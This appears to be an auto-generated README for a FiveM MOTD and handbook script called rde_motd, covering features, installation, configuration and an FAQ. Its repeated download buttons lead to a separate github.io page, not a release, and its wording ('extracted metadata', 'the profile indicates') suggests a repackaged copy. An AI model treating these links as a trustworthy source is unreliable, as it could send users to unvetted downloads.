# rde_motd v1.0.0 - Game Script Utility 2026

> **A FiveM utility for MOTD delivery and server handbook publishing, with admin-editable tab content and server-side documentation updates.** It is designed around Markdown content, an in-game editor, and synchronized live changes for active servers.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fisherzackrag2495/rde-motd-script-utility?style=flat-square)](https://github.com/fisherzackrag2495/rde-motd-script-utility)

---

<p align="center">
  <a href="https://fisherzackrag2495.github.io/rde-motd-script-utility/">
    <img src="https://img.shields.io/badge/Download-rde_motd%20Script-brightgreen?style=for-the-badge" alt="Download rde_motd Script">
  </a>
</p>

> **[Direct Download - rde_motd](https://fisherzackrag2495.github.io/rde-motd-script-utility/)**

---

[Download Latest Build](https://fisherzackrag2495.github.io/rde-motd-script-utility/)

---

## What it does

rde_motd is a FiveM server script made for delivering message-of-the-day content and handbook pages through a clean, structured interface. The workflow is centered on Markdown, which makes it straightforward to maintain rules, server notes, guides, and other in-game documentation that should stay easy to update.

It also ships with an in-game WYSIWYG editor plus an admin panel flow, so content can be revised without leaving the server environment. Published changes do not require a restart, and statebag-synced updates help keep what players see aligned across clients. The script also includes version-aware reshow behavior and multilingual support for servers that need recurring visibility and localized presentation.

## Features

- Six editable tabs for organizing MOTD and handbook content
- In-game WYSIWYG editor for direct content adjustments
- Markdown-based content management for structured text editing
- Database-backed persistence using oxmysql
- Statebag-synced updates for live content propagation
- Zero-restart publishing for updating content on the fly
- Version-based reshow behavior to re-display updated information
- Multilingual support for localized server documentation

## Installation

1. Place the `rde_motd-server-script` resource into your FiveM resources directory.
2. Ensure the required dependencies are available in your server environment, including ox_core, ox_lib, and oxmysql where used in your setup.
3. Start the resource from your server configuration.
4. Use the admin panel or in-game editor to create and manage your Markdown content.

Example resource start entry:

ensure rde_motd-server-script

## Configuration Options

| Setting | Purpose | Notes |
| --- | --- | --- |
| Tabs | Organize content into six sections | Useful for rules, guides, announcements, and notes |
| Editor mode | Edit content in the in-game WYSIWYG interface | Best for quick updates |
| Markdown source | Store and format handbook text in Markdown | Keeps content structured and portable |
| Persistence | Save content to the database | Requires your database configuration |
| Statebag sync | Broadcast content updates to connected clients | Supports live refresh behavior |
| Version reshow | Reopen content when the version changes | Helps surface updated information |
| Localization | Present content in multiple languages | Useful for multilingual communities |

## Compatibility

rde_motd is intended for FiveM server environments and targets the script stack referenced in the extracted metadata, including ox_core, ox_lib, and oxmysql where configured. Since it relies on server-side resources and database setup, results can differ depending on framework layout, editor permissions, and resource order.

Known limitations:
- Requires proper server resource installation and configuration
- Database-backed features depend on a working oxmysql setup
- Localization depends on the language data you provide
- Live update behavior assumes the relevant sync path is active in your server

## FAQ

### How do I install it?
Drop the resource folder into your FiveM resources directory, confirm the dependencies are available, and add an `ensure` line for it in `server.cfg`.

### Can I edit content in-game?
Yes. The script includes an in-game WYSIWYG editor for updating MOTD and handbook text without switching tools.

### Does it support Markdown?
Yes. Markdown-driven content management is part of the workflow, so you can maintain structured documentation in a familiar format.

### Do updates require a restart?
The script supports zero-restart publishing, so content can be pushed live without restarting the server resource.

### How are changes stored?
The profile indicates database-backed persistence, so content is saved through your configured database layer.

### Can I customize the tabs and wording?
Yes. The script is designed around editable tabs and localized content, so you can adapt it to your server's structure and language needs.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
